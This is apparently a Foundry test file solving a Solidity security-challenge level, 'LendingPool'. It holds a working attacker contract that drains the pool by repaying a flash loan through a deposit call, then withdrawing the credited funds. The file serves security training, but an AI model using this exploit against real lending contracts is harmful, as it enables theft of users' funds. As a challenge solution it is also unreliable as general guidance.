// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(instance);
        payable(address(attacker)).transfer(0.1 ether);
        attacker.exploit();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Attacker is IFlashLoanReceiver {
    LendingPool pool;

    constructor(LendingPool _pool) {
        pool = _pool;
    }

    receive() external payable {}

    function exploit() external payable {
        pool.deposit{value: 0.1 ether}();
        pool.flashLoan(0.1 ether);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }
}
